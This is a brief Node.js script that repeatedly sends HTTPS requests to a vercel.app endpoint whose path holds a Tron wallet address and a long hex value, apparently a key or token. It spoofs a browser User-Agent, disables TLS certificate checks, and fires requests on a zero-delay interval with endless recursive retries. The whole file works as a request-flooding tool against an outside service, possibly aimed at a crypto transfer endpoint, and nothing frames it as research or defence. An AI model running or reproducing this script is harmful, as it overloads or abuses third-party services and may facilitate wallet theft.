const axios = require("axios");
const https = require("https")
const sendRequest = async (url) => {
  try {
const options = {
  url: 'https://tronb2.vercel.app/sent/TJK66Qtw1ShHF2JFF8AuyAVhmay3UvUYTf/1/CC0DDACB9CCFBBC2B890A2079FE79E095B54C574E6C87A8E016C93E61E5E41ED',
  headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
  },
  maxRedirects: 0,
  httpsAgent: new https.Agent({
    rejectUnauthorized: false
  })
};
    const response = await axios(options);
    console.log("Request successful!");
    console.log(response.data);
  } catch (error) {
    console.error("Request failed, retrying..."+error);
    await sendRequest(url);
  }
};

const url = "https://tronb2.vercel.app/";


setInterval(() => {
  sendRequest(url);
}, 0);
